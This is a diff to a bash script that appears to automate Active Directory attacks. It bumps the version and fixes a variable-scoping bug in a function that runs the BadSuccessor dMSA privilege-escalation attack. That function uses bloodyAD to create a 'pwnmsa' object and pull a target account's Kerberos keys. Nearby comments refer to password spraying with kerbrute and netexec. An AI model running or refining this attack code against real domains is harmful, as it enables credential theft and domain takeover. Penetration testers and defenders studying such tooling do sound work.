@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.49.4"
+readonly VERSION="1.49.5"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -3771,7 +3771,10 @@ _badsuccessor_mark_and_pull() {
     # msDS-Superseded*, then the factory pulls the keys with badS4U2self.
     if [[ ! "$nt" =~ ^[0-9a-fA-F]{32}$ ]] && [[ -f "$BADSUCCESSOR_FAC_CC" ]] && have badS4U2self; then
         local cba=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$BADSUCCESSOR_FAC_USER" -k)
-        local dmsa="pwnmsa$RANDOM" dn="CN=${dmsa},${BADSUCCESSOR_FAC_OU}"
+        # dn in its OWN statement — same-line `local dmsa=.. dn=..${dmsa}..` would expand
+        # ${dmsa} empty → dn="CN=,${ou}" → cleanup removes the wrong object (orphan dMSA).
+        local dmsa="pwnmsa$RANDOM"
+        local dn="CN=${dmsa},${BADSUCCESSOR_FAC_OU}"
         run "KRB5CCNAME=<factory:$BADSUCCESSOR_FAC_USER> bloodyAD add badSuccessor $dmsa -t '$vdn' --ou '$BADSUCCESSOR_FAC_OU' --prepatch"
         KRB5CCNAME="$BADSUCCESSOR_FAC_CC" bloodyAD "${cba[@]}" add badSuccessor "$dmsa" -t "$vdn" --ou "$BADSUCCESSOR_FAC_OU" --prepatch >>"$LOGFILE" 2>&1
         # The internal S4U2self may have errored under --prepatch — verify the OBJECT exists.
